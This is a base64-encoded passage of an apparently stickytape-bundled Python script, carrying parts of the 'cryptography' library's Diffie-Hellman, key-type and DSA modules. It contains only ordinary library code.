JcbiAgICAgICAgaWYgZyA8IDI6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkRIIGdlbmVyYXRvciBtdXN0IGJlIDIgb3IgZ3JlYXRlciIpXHJcblxyXG4gICAgICAgIGlmIHAuYml0X2xlbmd0aCgpIDwgX01JTl9NT0RVTFVTX1NJWkU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAicCAobW9kdWx1cykgbXVzdCBiZSBhdCBsZWFzdCB7fS1iaXQiLmZvcm1hdChfTUlOX01PRFVMVVNfU0laRSlcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9wID0gcFxyXG4gICAgICAgIHNlbGYuX2cgPSBnXHJcbiAgICAgICAgc2VsZi5fcSA9IHFcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIERIUGFyYW1ldGVyTnVtYmVycyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLl9wID09IG90aGVyLl9wIGFuZCBzZWxmLl9nID09IG90aGVyLl9nIGFuZCBzZWxmLl9xID09IG90aGVyLl9xXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBwYXJhbWV0ZXJzKHNlbGYsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lKSAtPiAiREhQYXJhbWV0ZXJzIjpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgIGJhY2tlbmQgYXMgb3NzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBvc3NsLmxvYWRfZGhfcGFyYW1ldGVyX251bWJlcnMoc2VsZilcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGcoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9nXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcShzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbaW50XTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcVxyXG5cclxuXHJcbmNsYXNzIERIUHVibGljTnVtYmVyczpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB5OiBpbnQsIHBhcmFtZXRlcl9udW1iZXJzOiBESFBhcmFtZXRlck51bWJlcnMpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoeSwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ5IG11c3QgYmUgYW4gaW50ZWdlci4iKVxyXG5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShwYXJhbWV0ZXJfbnVtYmVycywgREhQYXJhbWV0ZXJOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInBhcmFtZXRlcnMgbXVzdCBiZSBhbiBpbnN0YW5jZSBvZiBESFBhcmFtZXRlck51bWJlcnMuIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3kgPSB5XHJcbiAgICAgICAgc2VsZi5fcGFyYW1ldGVyX251bWJlcnMgPSBwYXJhbWV0ZXJfbnVtYmVyc1xyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgREhQdWJsaWNOdW1iZXJzKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHNlbGYuX3kgPT0gb3RoZXIuX3lcclxuICAgICAgICAgICAgYW5kIHNlbGYuX3BhcmFtZXRlcl9udW1iZXJzID09IG90aGVyLl9wYXJhbWV0ZXJfbnVtYmVyc1xyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZSkgLT4gIkRIUHVibGljS2V5IjpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgIGJhY2tlbmQgYXMgb3NzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBvc3NsLmxvYWRfZGhfcHVibGljX251bWJlcnMoc2VsZilcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB5KHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5feVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHBhcmFtZXRlcl9udW1iZXJzKHNlbGYpIC0+IERIUGFyYW1ldGVyTnVtYmVyczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcGFyYW1ldGVyX251bWJlcnNcclxuXHJcblxyXG5jbGFzcyBESFByaXZhdGVOdW1iZXJzOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHg6IGludCwgcHVibGljX251bWJlcnM6IERIUHVibGljTnVtYmVycykgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh4LCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInggbXVzdCBiZSBhbiBpbnRlZ2VyLiIpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHB1YmxpY19udW1iZXJzLCBESFB1YmxpY051bWJlcnMpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAicHVibGljX251bWJlcnMgbXVzdCBiZSBhbiBpbnN0YW5jZSBvZiAiICJESFB1YmxpY051bWJlcnMuIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3ggPSB4XHJcbiAgICAgICAgc2VsZi5fcHVibGljX251bWJlcnMgPSBwdWJsaWNfbnVtYmVyc1xyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgREhQcml2YXRlTnVtYmVycyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLl94ID09IG90aGVyLl94XHJcbiAgICAgICAgICAgIGFuZCBzZWxmLl9wdWJsaWNfbnVtYmVycyA9PSBvdGhlci5fcHVibGljX251bWJlcnNcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHByaXZhdGVfa2V5KHNlbGYsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lKSAtPiAiREhQcml2YXRlS2V5IjpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgIGJhY2tlbmQgYXMgb3NzbCxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBvc3NsLmxvYWRfZGhfcHJpdmF0ZV9udW1iZXJzKHNlbGYpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcHVibGljX251bWJlcnMoc2VsZikgLT4gREhQdWJsaWNOdW1iZXJzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wdWJsaWNfbnVtYmVyc1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHgoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl94XHJcblxyXG5cclxuY2xhc3MgREhQYXJhbWV0ZXJzKG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZ2VuZXJhdGVfcHJpdmF0ZV9rZXkoc2VsZikgLT4gIkRIUHJpdmF0ZUtleSI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgR2VuZXJhdGVzIGFuZCByZXR1cm5zIGEgREhQcml2YXRlS2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwYXJhbWV0ZXJfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogX3NlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBfc2VyaWFsaXphdGlvbi5QYXJhbWV0ZXJGb3JtYXQsXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIHBhcmFtZXRlcnMgc2VyaWFsaXplZCBhcyBieXRlcy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcGFyYW1ldGVyX251bWJlcnMoc2VsZikgLT4gREhQYXJhbWV0ZXJOdW1iZXJzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYSBESFBhcmFtZXRlck51bWJlcnMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuREhQYXJhbWV0ZXJzV2l0aFNlcmlhbGl6YXRpb24gPSBESFBhcmFtZXRlcnNcclxuXHJcblxyXG5jbGFzcyBESFB1YmxpY0tleShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBiaXQgbGVuZ3RoIG9mIHRoZSBwcmltZSBtb2R1bHVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwYXJhbWV0ZXJzKHNlbGYpIC0+IERIUGFyYW1ldGVyczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgREhQYXJhbWV0ZXJzIG9iamVjdCBhc3NvY2lhdGVkIHdpdGggdGhpcyBwdWJsaWMga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwdWJsaWNfbnVtYmVycyhzZWxmKSAtPiBESFB1YmxpY051bWJlcnM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhIERIUHVibGljTnVtYmVycy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBrZXkgc2VyaWFsaXplZCBhcyBieXRlcy5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5ESFB1YmxpY0tleVdpdGhTZXJpYWxpemF0aW9uID0gREhQdWJsaWNLZXlcclxuXHJcblxyXG5jbGFzcyBESFByaXZhdGVLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgYml0IGxlbmd0aCBvZiB0aGUgcHJpbWUgbW9kdWx1cy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBESFB1YmxpY0tleTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgREhQdWJsaWNLZXkgYXNzb2NpYXRlZCB3aXRoIHRoaXMgcHJpdmF0ZSBrZXkuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHBhcmFtZXRlcnMoc2VsZikgLT4gREhQYXJhbWV0ZXJzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBESFBhcmFtZXRlcnMgb2JqZWN0IGFzc29jaWF0ZWQgd2l0aCB0aGlzIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBleGNoYW5nZShzZWxmLCBwZWVyX3B1YmxpY19rZXk6IERIUHVibGljS2V5KSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBHaXZlbiBwZWVyXCdzIERIUHVibGljS2V5LCBjYXJyeSBvdXQgdGhlIGtleSBleGNoYW5nZSBhbmRcclxuICAgICAgICByZXR1cm4gc2hhcmVkIGtleSBhcyBieXRlcy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHJpdmF0ZV9udW1iZXJzKHNlbGYpIC0+IERIUHJpdmF0ZU51bWJlcnM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhIERIUHJpdmF0ZU51bWJlcnMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHByaXZhdGVfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogX3NlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBfc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBfc2VyaWFsaXphdGlvbi5LZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUga2V5IHNlcmlhbGl6ZWQgYXMgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuREhQcml2YXRlS2V5V2l0aFNlcmlhbGl6YXRpb24gPSBESFByaXZhdGVLZXlcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9hc3ltbWV0cmljL3R5cGVzLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYyBpbXBvcnQgKFxyXG4gICAgZGgsXHJcbiAgICBkc2EsXHJcbiAgICBlYyxcclxuICAgIGVkMjU1MTksXHJcbiAgICBlZDQ0OCxcclxuICAgIHJzYSxcclxuICAgIHgyNTUxOSxcclxuICAgIHg0NDgsXHJcbilcclxuXHJcblxyXG4jIEV2ZXJ5IGFzeW1tZXRyaWMga2V5IHR5cGVcclxuUFVCTElDX0tFWV9UWVBFUyA9IHR5cGluZy5VbmlvbltcclxuICAgIGRoLkRIUHVibGljS2V5LFxyXG4gICAgZHNhLkRTQVB1YmxpY0tleSxcclxuICAgIHJzYS5SU0FQdWJsaWNLZXksXHJcbiAgICBlYy5FbGxpcHRpY0N1cnZlUHVibGljS2V5LFxyXG4gICAgZWQyNTUxOS5FZDI1NTE5UHVibGljS2V5LFxyXG4gICAgZWQ0NDguRWQ0NDhQdWJsaWNLZXksXHJcbiAgICB4MjU1MTkuWDI1NTE5UHVibGljS2V5LFxyXG4gICAgeDQ0OC5YNDQ4UHVibGljS2V5LFxyXG5dXHJcbiMgRXZlcnkgYXN5bW1ldHJpYyBrZXkgdHlwZVxyXG5QUklWQVRFX0tFWV9UWVBFUyA9IHR5cGluZy5VbmlvbltcclxuICAgIGRoLkRIUHJpdmF0ZUtleSxcclxuICAgIGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXksXHJcbiAgICBlZDQ0OC5FZDQ0OFByaXZhdGVLZXksXHJcbiAgICByc2EuUlNBUHJpdmF0ZUtleSxcclxuICAgIGRzYS5EU0FQcml2YXRlS2V5LFxyXG4gICAgZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXksXHJcbiAgICB4MjU1MTkuWDI1NTE5UHJpdmF0ZUtleSxcclxuICAgIHg0NDguWDQ0OFByaXZhdGVLZXksXHJcbl1cclxuIyBKdXN0IHRoZSBrZXkgdHlwZXMgd2UgYWxsb3cgdG8gYmUgdXNlZCBmb3IgeDUwOSBzaWduaW5nLiBUaGlzIG1pcnJvcnNcclxuIyB0aGUgY2VydGlmaWNhdGUgcHVibGljIGtleSB0eXBlc1xyXG5DRVJUSUZJQ0FURV9QUklWQVRFX0tFWV9UWVBFUyA9IHR5cGluZy5VbmlvbltcclxuICAgIGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXksXHJcbiAgICBlZDQ0OC5FZDQ0OFByaXZhdGVLZXksXHJcbiAgICByc2EuUlNBUHJpdmF0ZUtleSxcclxuICAgIGRzYS5EU0FQcml2YXRlS2V5LFxyXG4gICAgZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXksXHJcbl1cclxuIyBKdXN0IHRoZSBrZXkgdHlwZXMgd2UgYWxsb3cgdG8gYmUgdXNlZCBmb3IgeDUwOSBzaWduaW5nLiBUaGlzIG1pcnJvcnNcclxuIyB0aGUgY2VydGlmaWNhdGUgcHJpdmF0ZSBrZXkgdHlwZXNcclxuQ0VSVElGSUNBVEVfSVNTVUVSX1BVQkxJQ19LRVlfVFlQRVMgPSB0eXBpbmcuVW5pb25bXHJcbiAgICBkc2EuRFNBUHVibGljS2V5LFxyXG4gICAgcnNhLlJTQVB1YmxpY0tleSxcclxuICAgIGVjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXksXHJcbiAgICBlZDI1NTE5LkVkMjU1MTlQdWJsaWNLZXksXHJcbiAgICBlZDQ0OC5FZDQ0OFB1YmxpY0tleSxcclxuXVxyXG4jIFRoaXMgdHlwZSByZW1vdmVzIERIUHVibGljS2V5LiB4NDQ4L3gyNTUxOSBjYW4gYmUgYSBwdWJsaWMga2V5XHJcbiMgYnV0IGNhbm5vdCBiZSB1c2VkIGluIHNpZ25pbmcgc28gdGhleSBhcmUgYWxsb3dlZCBoZXJlLlxyXG5DRVJUSUZJQ0FURV9QVUJMSUNfS0VZX1RZUEVTID0gdHlwaW5nLlVuaW9uW1xyXG4gICAgZHNhLkRTQVB1YmxpY0tleSxcclxuICAgIHJzYS5SU0FQdWJsaWNLZXksXHJcbiAgICBlYy5FbGxpcHRpY0N1cnZlUHVibGljS2V5LFxyXG4gICAgZWQyNTUxOS5FZDI1NTE5UHVibGljS2V5LFxyXG4gICAgZWQ0NDguRWQ0NDhQdWJsaWNLZXksXHJcbiAgICB4MjU1MTkuWDI1NTE5UHVibGljS2V5LFxyXG4gICAgeDQ0OC5YNDQ4UHVibGljS2V5LFxyXG5dXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvYXN5bW1ldHJpYy9kc2EucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgX3NlcmlhbGl6YXRpb24sIGhhc2hlc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljIGltcG9ydCAoXHJcbiAgICB1dGlscyBhcyBhc3ltX3V0aWxzLFxyXG4pXHJcblxyXG5cclxuY2xhc3MgRFNBUGFyYW1ldGVycyhtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGdlbmVyYXRlX3ByaXZhdGVfa2V5KHNlbGYpIC0+ICJEU0FQcml2YXRlS2V5IjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBHZW5lcmF0ZXMgYW5kIHJldHVybnMgYSBEU0FQcml2YXRlS2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwYXJhbWV0ZXJfbnVtYmVycyhzZWxmKSAtPiAiRFNBUGFyYW1ldGVyTnVtYmVycyI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhIERTQVBhcmFtZXRlck51bWJlcnMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuRFNBUGFyYW1ldGVyc1dpdGhOdW1iZXJzID0gRFNBUGFyYW1ldGVyc1xyXG5cclxuXHJcbmNsYXNzIERTQVByaXZhdGVLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgYml0IGxlbmd0aCBvZiB0aGUgcHJpbWUgbW9kdWx1cy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiAiRFNBUHVibGljS2V5IjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgRFNBUHVibGljS2V5IGFzc29jaWF0ZWQgd2l0aCB0aGlzIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwYXJhbWV0ZXJzKHNlbGYpIC0+IERTQVBhcmFtZXRlcnM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIERTQVBhcmFtZXRlcnMgb2JqZWN0IGFzc29jaWF0ZWQgd2l0aCB0aGlzIHByaXZhdGUga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBzaWduKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYWxnb3JpdGhtOiB0eXBpbmcuVW5pb25bYXN5bV91dGlscy5QcmVoYXNoZWQsIGhhc2hlcy5IYXNoQWxnb3JpdGhtXSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2lnbnMgdGhlIGRhdGFcclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHJpdmF0ZV9udW1iZXJzKHNlbGYpIC0+ICJEU0FQcml2YXRlTnVtYmVycyI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhIERTQVByaXZhdGVOdW1iZXJzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwcml2YXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IF9zZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogX3NlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogX3NlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGtleSBzZXJpYWxpemVkIGFzIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbkRTQVByaXZhdGVLZXlXaXRoU2VyaWFsaXphdGlvbiA9IERTQVByaXZhdGVLZXlcclxuXHJcblxyXG5jbGFzcyBEU0FQdWJsaWNLZXkobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgYml0IGxlbmd0aCBvZiB0aGUgcHJpbWUgbW9kdWx1cy5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcGFyYW1ldGVycyhzZWxmKSAtPiBEU0FQYXJhbWV0ZXJzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSBEU0FQYXJhbWV0ZXJzIG9iamVjdCBhc3NvY2lhdGVkIHdpdGggdGhpcyBwdWJsaWMga2V5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwdWJsaWNfbnVtYmVycyhzZWxmKSAtPiAiRFNBUHVibGljTnVtYmVycyI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhIERTQVB1YmxpY051bWJlcnMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBfc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IF9zZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUga2V5IHNlcmlhbGl6ZWQgYXMgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHZlcmlmeShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHNpZ25hdHVyZTogYnl0ZXMsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYWxnb3JpdGhtOiB0eXBpbmcuVW5pb25bYXN5bV91dGlscy5QcmVoYXNoZWQsIGhhc2hlcy5IYXNoQWxnb3JpdGhtXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBWZXJpZmllcyB0aGUgc2lnbmF0dXJlIG9mIHRoZSBkYXRhLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbkRTQVB1YmxpY0tleVdpdGhTZXJpYWxpemF0aW9uID0gRFNBUHVibGljS2V5XHJcblxyXG5cclxuY2xhc3MgRFNBUGFyYW1ldGVyTnVtYmVyczpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwOiBpbnQsIHE6IGludCwgZzogaW50KTpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIG5vdCBpc2luc3RhbmNlKHAsIGludClcclxuICAgICAgICAgICAgb3Igbm90IGlzaW5zdGFuY2UocSwgaW50KVxyXG4gICAgICAgICAgICBvciBub3QgaXNpbnN0YW5jZShnLCBpbnQpXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkRTQVBhc